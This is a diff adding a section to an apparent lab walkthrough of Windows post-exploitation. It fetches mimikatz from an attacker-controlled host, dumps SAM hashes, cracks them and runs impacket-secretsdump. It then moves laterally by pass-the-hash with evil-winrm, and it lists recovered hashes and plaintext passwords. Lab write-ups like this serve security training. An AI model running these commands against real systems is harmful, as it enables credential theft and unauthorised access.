@@ -119,4 +119,77 @@ It's like when you score too many points in <a href="https://www.youtube.com/wat
 
 <img src="images/nbajam.png" style="border: 2px solid white"><br>
 
+Now let's make use of our elevated account. I'm going to exit this shell and start a new ssh session with our Local Administrator account.
 
+(P.S you'll notice some IPs have changed from here as I came back another day)
+
+```ssh notanaccountant@192.168.162.141```
+
+<img src="images/elevatedssh.png" style="border: 2px solid white"><br>
+
+Time to have some fun. Lateral movement and compromise of ActiveDirectory (AD) can be done in a million different ways. I'm going to try using <a href="https://github.com/ParrotSec/mimikatz">mimikatz</a>.
+
+Bring it over to the target:
+
+```iwr -uri http://192.168.45.243/mimikatz.exe -Outfile mimikatz.exe```
+
+Execute it:
+
+```.\mimikatz.exe```
+
+Elevate token:
+
+```token::elevate```
+
+And privilege debug:
+
+```privilege::debug```
+
+<img src="images/mimikatz1.png" style="border: 2px solid white"><br>
+
+Then we can dump some creds! 
+
+```lsadump::sam```
+
+<img src="images/mimikatz2.png" style="border: 2px solid white"><br>
+
+Taking that first Hash NTLM from the `Administrator` account and throwing it in crackstation.net (because I'm too lazy to whip out hashcat at this point):
+
+<img src="images/crackstation.png" style="border: 2px solid white"><br>
+
+We see the password was "December31". The `support` user also had an easy password:
+
+<img src="images/supportuser.png" style="border: 2px solid white"><br>
+
+<img src="images/supportuser2.png" style="border: 2px solid white"><br>
+
+"Freedom1". This might come in handy later. 
+
+Okay let's take a step back. Now that we've got some hashes and plaintext passwords, let's try dumping some secrets. We know from winPEAS that the `celia.almeda` account had AutoLogon credentials, let's see if we can dump them. 
+
+Firstly, install impackets on your Kali machine:
+
+```python3 -m pipx install impacket```
+
+Then we can run `secretsdump` and pass it the Administrators password. Notably, we can also have just passed it the hash we got from mimikatz, but I like knowing the plaintext password as well.
+
+```impacket-secretsdump 'MSO1/Administrator:December31@192.168.162.141'```
+
+OR
+
+```impacket-secretsdump administrator@192.168.162.141 -hashes :3c4495bbd678fac8c9d218be4f2bbc7b```
+
+
+<img src="images/secretdump.png" style="border: 2px solid white"><br>
+
+Look nice and closely
+
+<img src="images/defaultpassword.png" style="border: 2px solid white"><br>
+
+Boom!
+
+Now we can use celia's account to pivot!
+
+```evil-winrm -i 10.10.122.142 -u "celia.almeda" -H E728ECBADFB02F51CE8EED753F3FF3FD```
+
+celia password 7k8XHk3dMtmpnC7
